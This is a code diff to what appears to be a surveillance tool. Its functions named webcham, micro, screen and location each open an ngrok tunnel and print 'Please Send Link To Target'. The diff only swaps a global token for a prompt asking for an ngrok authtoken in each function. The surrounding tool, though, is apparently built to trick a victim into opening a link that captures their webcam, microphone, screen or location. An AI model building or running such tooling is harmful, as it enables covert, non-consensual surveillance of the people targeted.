@@ -70,7 +70,6 @@ def webcham():
   deafult_server()
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
   banner.banner()
-  global token
   token=str(input("Input authtoken ngrok: "))
   a = ngrok.connect(4545,"http",auth_token=token)
   print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
@@ -149,7 +148,7 @@ def micro():
     deafult_server()
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
     banner.banner()
-    global token
+    token=str(input("Input authtoken ngrok: "))
     a = ngrok.connect(6565,"http",auth_token=token)
     print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
     print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Please Send Link To Target")
@@ -223,7 +222,7 @@ def screen():
       
     deafult_server()
       # - - - - - - - - - - -- - - - - - - - - - - - - - - -
-    global token
+    token=str(input("Input authtoken ngrok: "))
     a = ngrok.connect(4387,"http",auth_token=token)
     print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
     print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Please Send Link To Target")
@@ -325,7 +324,7 @@ def location():
   
   deafult_server()
       # - - - - - - - - - - -- - - - - - - - - - - - - - - -
-  global token
+  token=str(input("Input authtoken ngrok: "))
   a = ngrok.connect(8767,"http",auth_token=token)
   print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
   print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Please Send Link To Target")
